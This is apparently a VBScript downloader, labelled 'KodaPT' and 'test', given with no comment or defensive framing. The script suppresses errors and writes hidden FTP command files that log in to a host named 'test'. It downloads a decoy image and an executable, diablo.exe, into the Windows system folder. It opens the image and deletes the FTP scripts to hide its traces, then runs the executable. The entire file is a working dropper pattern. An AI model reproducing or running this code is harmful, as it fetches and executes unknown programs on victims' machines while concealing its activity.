rem KodaPT
rem test
On error resume next
Dim Script_2
Dim FTP
Dim FTP2
Dim Script_1
Set FTP = WScript.CreateObject("WScript.Shell")
Set FTP2 = WScript.CreateObject("WScript.Shell")
Set A1 = CreateObject( "Scripting.FileSystemObject")
Set Script_1 = A1.CreateTextFile("C:\Good.txt",8)
Set A2 = CreateObject( "Scripting.FileSystemObject")
Set Script_2 = A2.CreateTextFile("C:\Bad.txt",8)
Dim fso, dirsystem
Set fso = CreateObject("Scripting.FileSystemObject")
dirsystem = fso.getspecialfolder(1)
Script_1.Writeline "test"
Script_1.Writeline "password"
Script_1.Writeline "Binary"
Script_1.Writeline "get pic.gif " & dirsystem & "\pic.gif"
Script_1.Writeline "bye"
Script_1.Close
Script_2.Writeline "test"
Script_2.Writeline "password"
Script_2.Writeline "Binary"
Script_2.Writeline "get diablo.exe " & dirsystem & "\diablo.exe"
Script_2.Writeline "bye"
Script_2.Close
Ftp.Run "ftp  -s:C:\Good.txt test",0,True
Ftp.Run dirsystem & "\pic.gif"
Ftp.Run "ftp  -s:C:\Bad.txt test",0,True
Dim fs
Set fs = CreateObject("Scripting.FileSystemObject")
fs.deletefile "C:\Bad.txt"
fs.deletefile "C:\Good.txt"
Ftp2.Run dirsystem & "\diablo.exe",1,True

